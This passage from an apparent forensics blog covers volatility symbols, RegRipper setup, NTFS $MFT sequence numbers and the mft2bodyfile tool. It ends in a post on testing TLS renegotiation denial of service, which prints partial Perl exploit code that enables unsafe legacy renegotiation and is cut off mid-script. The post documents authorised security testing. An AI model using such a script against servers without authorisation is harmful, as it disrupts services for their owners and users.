<p>Assume, you have <em>Python v3.9</em> and <em>volatility3 v2.0.3</em>, then you symbols directory is <code>venv/lib/python3.9/site-packages/volatility3-2.0.3-py3.9.egg/volatility3/symbols/</code>. We will refer to it as <code>$SYMBOLS_DIR</code>:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mkdir $SYMBOLS_DIR/linux</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mv centos7-3.10.0-862.3.2.el7.x86_64.json.xz $SYMBOLS_DIR/linux</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>That&#x27;s it. Now, you have a matching profile ready to be used.</p></div></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/blog/2021/11/02/Using-regripper-on-darwin">Using regripper on MacOS</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2021-11-02T00:00:00.000Z">November 2, 2021</time> · <!-- -->One min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer" class="avatar__photo-link"><img class="avatar__photo" src="https://github.com/janstarke.png" alt="Jan Starke"></a><div class="avatar__intro"><div class="avatar__name"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer"><span>Jan Starke</span></a></div><small class="avatar__subtitle">Senior Forensic Analyst</small></div></div></div></div></header><div class="markdown"><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">git clone https://github.com/keydet89/RegRipper3.0.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cpan install Parse::Win32Registry</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># find out where Parse::Win32Registry was installed</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cp -r /usr/local/Cellar/perl/5.34.0/lib/perl5/site_perl/5.34.0/Parse .</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mv *.pm Parse/Win32Registry/WinNT/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="fixing-construction-of-the-plugins-path">Fixing construction of the <code>plugins</code> path<a class="hash-link" aria-label="Direct link to fixing-construction-of-the-plugins-path" title="Direct link to fixing-construction-of-the-plugins-path" href="/blog#fixing-construction-of-the-plugins-path">​</a></h2>
<p>On unixoid systems, <code>rip.pl</code> ignores the folder where it is stored and looks for the <code>plugins</code> folder in the current working directory (<a href="https://github.com/keydet89/RegRipper3.0/issues/42" target="_blank" rel="noopener noreferrer">https://github.com/keydet89/RegRipper3.0/issues/42</a>). This can be fixed using the following patch:</p>
<div class="language-diff codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-diff codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">diff --git a/Analysis/RegRipper3.0/rip.pl b/Analysis/RegRipper3.0/rip.pl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">index 8f626a7..9027209 100644</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--- a/Analysis/RegRipper3.0/rip.pl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+++ b/Analysis/RegRipper3.0/rip.pl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@@ -67,7 +67,7 @@ $str =~ s/($path[scalar(@path) - 1])//;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> # code updated 20190318</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> my $plugindir;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ($^O eq &quot;MSWin32&quot;) ? ($plugindir = $str.&quot;plugins/&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-                   : ($plugindir = File::Spec-&gt;catfile(&quot;plugins&quot;));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+                   : ($plugindir = File::Spec-&gt;catfile($str, &quot;plugins&quot;));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> #my $plugindir = $str.&quot;plugins/&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> #my $plugindir = File::Spec-&gt;catfile(&quot;plugins&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> #print &quot;Plugins Dir = &quot;.$plugindir.&quot;\n&quot;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h1>Usage example</h1>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PERL5LIB=$(pwd) perl rip.pl -r Amcache.hve -p amcache_tln &gt;amcache.tln</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h1>Convert <code>TLN</code> format to <code>bodyfile</code> format</h1>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">awk -F &#x27;|&#x27; &#x27;{OFS=&quot;|&quot;;print 0,$5,0,0,0,0,0,-1,$1,-1,-1}&#x27; &lt;test.tln |TZ=UTC mactime -b - -d</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/blog/2021/10/22/mft_entry_sequence">Forensic analysis of deleted `$MFT` entries</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2021-10-22T00:00:00.000Z">October 22, 2021</time> · <!-- -->3 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer" class="avatar__photo-link"><img class="avatar__photo" src="https://github.com/janstarke.png" alt="Jan Starke"></a><div class="avatar__intro"><div class="avatar__name"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer"><span>Jan Starke</span></a></div><small class="avatar__subtitle">Senior Forensic Analyst</small></div></div></div></div></header><div class="markdown"><p>In the book <em>FILE SYSTEM FORENSIC ANALYSIS</em>, the author <em>Brian Carrier</em> states that <em>&quot;Every MFT entry also has a 16-bit sequence numberthat is incremented when the entry is allocated. For example, consider MFT entry 313 with a sequence number of 1. The file that allocated entry 313 is deleted, and the entry is allocated to a new file. When the entry is reallocated, it has a new sequence number of 2.&quot;</em> (page 276).</p>
<p>I think this i partially wrong. Let&#x27;s see what Microsoft is saying: <em>&quot;The sequence number. This value is incremented each time that a file record segment is freed; it is 0 if the segment is not used. The SequenceNumber field of a file reference must match the contents of this field; if they do not match, the file reference is incorrect and probably obsolete.&quot;</em> (<a href="https://docs.microsoft.com/en-us/windows/win32/devnotes/file-record-segment-header" target="_blank" rel="noopener noreferrer">https://docs.microsoft.com/en-us/windows/win32/devnotes/file-record-segment-header</a>)</p>
<p>This information is crucial when you found a file which has been content of some deleted folder. To retrieve the folders name, you need to find its <code>$FILE_NAME</code> information. So, you take the <code>parent</code> field from the <code>$FILE_NAME</code>attribute of the deleted file. Let&#x27;s assume this is <code>313-1</code> (where <code>313</code> is the parent entry number and <code>1</code> is its sequence number). Further, let&#x27;s assume that this parent has been deleted, but the MFT entry was not reallocated:</p>
<ul>
<li>If the sequence number was incremented upon reallocated, it would still be <code>1</code></li>
<li>Otherwise, if the sequence number was incremented when deleting the folder, it would be <code>2</code> now.</li>
</ul>
<p>But how can we be sure that we can use the <code>$FILE_NAME</code> of <code>313-2</code>, if the deleted file refered to <code>313-1</code>?</p>
<h1>Let&#x27;s test what happens.</h1>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="test-setup">Test setup<a class="hash-link" aria-label="Direct link to Test setup" title="Direct link to Test setup" href="/blog#test-setup">​</a></h2>
<p>I created a NTFS partition using Windows 8, and created three folders:</p>
<ul>
<li><code>bulk delete</code></li>
<li><code>single delete</code></li>
<li><code>mixed delete</code></li>
</ul>
<p>Each folder had two files: <code>sample1.rtf</code> and <code>samples.rtf</code>. Than I did the following:</p>
<ul>
<li>delete <code>bulk delete</code> with all its contents</li>
<li>delete <code>mixed delete/sample2.rtf</code></li>
<li>delete <code>mixed delete</code> with all of its contents (<code>sample1.rtf</code>)</li>
<li>delete <code>single delete/sample1.rtf</code></li>
<li>delete <code>single delete/sample2.rtf</code></li>
<li>delete <code>single delete</code> with all of its contents (none)</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="results">Results<a class="hash-link" aria-label="Direct link to Results" title="Direct link to Results" href="/blog#results">​</a></h2>
<p>After deletion, I found the following MFT references</p>
<table><thead><tr><th>Name</th><th>Entry #</th><th>Parent entry #</th></tr></thead><tbody><tr><td><code>bulk delete</code></td><td><code>37-2</code></td><td><code>5-5</code></td></tr><tr><td><code>bulk delete/sample1.rtf</code></td><td><code>43-2</code></td><td><code>37-1</code></td></tr><tr><td><code>bulk delete/sample2.rtf</code></td><td><code>44-2</code></td><td><code>37-1</code></td></tr><tr><td><code>single delete</code></td><td><code>41-2</code></td><td></td></tr><tr><td><code>single delete/sample1.rtf</code></td><td><code>47-2</code></td><td><code>41-1</code></td></tr><tr><td><code>single delete/sample2.rtf</code></td><td><code>48-2</code></td><td><code>41-1</code></td></tr><tr><td><code>mixed delete</code></td><td><code>42-2</code></td><td></td></tr><tr><td><code>mixed delete/sample1.rtf</code></td><td><code>45-1</code></td><td><code>42-1</code></td></tr><tr><td><code>mixed delete/sample2.rtf</code></td><td><code>46-1</code></td><td><code>42-1</code></td></tr></tbody></table>
<p>Obviously, our test shows that sequence numbers are incremented right after deletion, but <em>not</em> nessecarily at reallocation. The Microsoft documentation is right.</p></div></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/blog/2021/10/17/mft2bodyfile2">$MFT file parser improved</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2021-10-17T00:00:00.000Z">October 17, 2021</time> · <!-- -->One min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer" class="avatar__photo-link"><img class="avatar__photo" src="https://github.com/janstarke.png" alt="Jan Starke"></a><div class="avatar__intro"><div class="avatar__name"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer"><span>Jan Starke</span></a></div><small class="avatar__subtitle">Senior Forensic Analyst</small></div></div></div></div></header><div class="markdown"><p>I added some improvements to <code>mft2bodyfile</code> (<a href="https://github.com/janstarke/mft2bodyfile" target="_blank" rel="noopener noreferrer">https://github.com/janstarke/mft2bodyfile</a>) and released version <em>0.5.0</em>. Mainly, the following things have changed:</p>
<ul>
<li>I fixed the problem with nonresident attributes: <code>mft2bodyfile</code> reads all (really: <em>all</em>) MFT entries and tries to correlate them. This is possible, because there is a bidirectional relationship between the base entry and the nonbase entries. Until now, I started with the base entry and tried to find the corresponding nonbase entries, which failed if the <code>$ATTRIBUTE_LIST</code> was nonresident. Now, I don&#x27;t try to find the nonbase entries, but instead use the base reference to find the base entry.</li>
<li>The performance has improved a lot.</li>
</ul>
<p>Only one thing (at the moment): Sometimes there are nonbase entries which belonged to base entries of deleted files (this can be detected to the sequence numbers of the base reference and the entry at the base position do not match). This is no problem, until we try to read <code>$STANDARD_INFORMATION</code>or <code>$FILENAME</code>, which may not be existing anymore. These entries are ignored by <code>mft2bodyfile</code>.</p></div></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/blog/2021/05/16/mft2bodyfile">$MFT file parser finalized</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2021-05-16T00:00:00.000Z">May 16, 2021</time> · <!-- -->2 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer" class="avatar__photo-link"><img class="avatar__photo" src="https://github.com/janstarke.png" alt="Jan Starke"></a><div class="avatar__intro"><div class="avatar__name"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer"><span>Jan Starke</span></a></div><small class="avatar__subtitle">Senior Forensic Analyst</small></div></div></div></div></header><div class="markdown"><p>After some days of work, I finalized version <em>0.3.0</em> of <code>mft2bodyfile</code> (<a href="https://github.com/janstarke/mft2bodyfile" target="_blank" rel="noopener noreferrer">https://github.com/janstarke/mft2bodyfile</a>), which is aimed to be a replacement for <code>analyze_mft.py</code>, which is abandoned.</p>
<p>Until now, me and my team used <code>analyze_mft.py</code> to extract data from the <code>$MFT</code>, when we got triage data from a customer. Unfortunately, <code>analyze_mft.py</code> has some disadvantages:</p>
<ul>
<li>python2 is required</li>
<li>either the <code>$STANDARD_INFORMATION</code> or the <code>$FILE_NAME</code> attribute used to generate the timestamps, bot not both of them at the same time. This always required us to merge both outputs, which is a little bit messy</li>
<li>from time to time we had problems parsing the <code>$MFT</code></li>
</ul>
<p>So, at first we started to work on <code>analyze_mft.py</code> to fix our complaints, but we soon got stuck when we discovered one additional disadvantage:</p>
<ul>
<li>If a file has its <code>$FILE_NAME</code> attribute not stored in its base entry, but in some nonbase entry which is refered by an <code>$ATTRIBUTE_LIST</code> attribute, then this file is not shown in the bodyfile.</li>
</ul>
<p>You might think that &quot;non-base MFT entries do not have the <code>$FILE_NAME</code> and <code>$STANDARD_INFORMATION</code> attributes in them&quot;, as Brian Carrier has stated in his great book. But we found that this does happen. Further investigation showed us that nearly all fast and simple tools have the same problem. So this was the last bit that led us write a tool for our own.</p>
<h1>What are the advantages of this tool?</h1>
<ul>
<li>way more faster than <code>analyze_mft.py</code></li>
<li>all files are displayed, even if they don&#x27;t have a &#x27;$FILENAME&#x27; (Really??? Files can have no filename? Yes, they can. See below)</li>
</ul>
<h1>What are the limits of this tool?</h1>
<p>Consider the following situation: You have a file, which has a lot of attributes. The list of attributes is so long, that it cannot be stored in an <code>$MFT</code> entry. So, the <code>$ATTRIBUTE_LIST</code> attribute is stored as a nonresident attribute, outside the <code>$MFT</code>. At the moment, <code>mft2bodyfile</code> is not able to find the corresponding <code>$MFT</code> entries, and will generate a filename.</p>
<p>Can we fix this? Yes, we can. If we detect such a situation, we can search the <code>$MFT</code> entries which refer to our base entry, and use those to find a <code>$FILE_NAME</code> attribute.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="update-fixed-in-050">Update: fixed in <em>0.5.0</em><a class="hash-link" aria-label="Direct link to update-fixed-in-050" title="Direct link to update-fixed-in-050" href="/blog#update-fixed-in-050">​</a></h2></div></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/blog/2021/03/25/DoSing-TLS-endpoints">DoSing TLS endpoints</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2021-03-25T00:00:00.000Z">March 25, 2021</time> · <!-- -->3 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer" class="avatar__photo-link"><img class="avatar__photo" src="https://github.com/janstarke.png" alt="Jan Starke"></a><div class="avatar__intro"><div class="avatar__name"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer"><span>Jan Starke</span></a></div><small class="avatar__subtitle">Senior Forensic Analyst</small></div></div></div></div></header><div class="markdown"><p>During these day, I had an interesting task: to test if som specific endpoint is vulnerable against a client-side TLS renegotiation DoS vulnerability.</p>
<p>Negotiating a shared secret requires a lot of computation and thus needs some CPU time. The idea of the attack is to initiate a TLS connection and then request a renegotiation of the shared secret over and over again. This would consume a lot of CPU time from the server, which is the resource we&#x27;re going to exhaust.</p>
<h1>The test</h1>
<p>To exploit the vulnerability, you must make sure that the client consume much less CPU time than the server does. So, you have to tweak the renegotiation. I didn&#x27;t do this, becaus I wasn&#x27;t interested in really exhausting the server resources. I was only interested in the following questions:</p>
<ul>
<li>Does the server really support client-initiated renegotiation?</li>
<li>How many renegotiations are allowed by the server before it terminates the connection?</li>
</ul>
<h1>What did I learn?</h1>
<p>Most TLS implementations have removed the client-initiated renegotiation from its source code, so If you use an up-to-date implementation, chances are good that you are not vulnerable.</p>
<h1>Expoit source code</h1>
<div class="language-perl codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-perl codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use Socket;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use Net::SSLeay qw(die_now die_if_ssl_error) ;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use strict;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use warnings;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use Errno qw(EINTR EIO :POSIX);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use IO::Socket::INET;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Net::SSLeay::load_error_strings();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Net::SSLeay::SSLeay_add_ssl_algorithms();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Net::SSLeay::randomize();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $hostname = &quot;&lt;yourhost&gt;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $port = &quot;443&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $request = &quot;HEAD / HTTP/1.1\r\n\r\n&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub error_name($) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $id = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my @errors = (</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &#x27;SSL_ERROR_NONE&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &#x27;SSL_ERROR_SSL&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &#x27;SSL_ERROR_WANT_READ&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &#x27;SSL_ERROR_WANT_WRITE&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &#x27;SSL_ERROR_WANT_X509_LOOKUP&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &#x27;SSL_ERROR_SYSCALL&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &#x27;SSL_ERROR_ZERO_RETURN&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &#x27;SSL_ERROR_WANT_CONNECT&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &#x27;SSL_ERROR_WANT_ACCEPT&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    );</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die &quot;invalid error number&quot; unless $errors[$id];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $result;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return $errors[$id];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub display_result($$$) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $ssl = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $result = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $function = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die_if_ssl_error(&quot;ssl $function ($!)&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if (0 != (my $error_id = Net::SSLeay::get_error($ssl, $result))) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        my $error = error_name($error_id);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        print (&quot;$function() = $error\n&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        while (0 != (my $rv = Net::SSLeay::ERR_get_error())) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            my $error_desc = Net::SSLeay::ERR_error_string($rv);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            print (&quot;stack: $error_desc\n&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub set_options($$) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $ctx = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $option = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Net::SSLeay::CTX_set_options($ctx, $option)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     and die_if_ssl_error(&quot;ssl ctx set options ($!)&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub set_version($$) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $ctx = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $version = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Net::SSLeay::CTX_set_ssl_version($ctx, $version)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     and die_if_ssl_error(&quot;ssl ctx set version ($!)&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub set_ciphers($$) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $ctx = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $ciphers = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Net::SSLeay::CTX_set_cipher_list($ctx, $ciphers)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     and die_if_ssl_error(&quot;ssl ctx set ciphers suites ($!)&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub ssl_connect($$) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $ctx = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $socket = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $ssl = Net::SSLeay::new($ctx) or die_now(&quot;Failed to create SSL $!&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Net::SSLeay::set_fd($ssl, $socket-&gt;fileno);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $res = Net::SSLeay::connect($ssl) and die_if_ssl_error(&quot;ssl connect ($!)&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $error = error_name(Net::SSLeay::get_error($ssl, $res));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    print (&quot;connect() = $error\n&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    print &quot;Cipher `&quot; . Net::SSLeay::get_cipher($ssl) . &quot;&#x27;\n&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return $ssl;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub configure_context($$) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $ctx = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    my $ciphers = shift;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    set_options($ctx, &amp;Net::SSLeay::OP_ALL);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    set_options($ctx, &amp;Net::SSLeay::OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    #set_options($ctx, &amp;Net::SSLeay::OP_SSL_OP_LEGACY_SERVER_CONNECT);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    set_version($ctx, 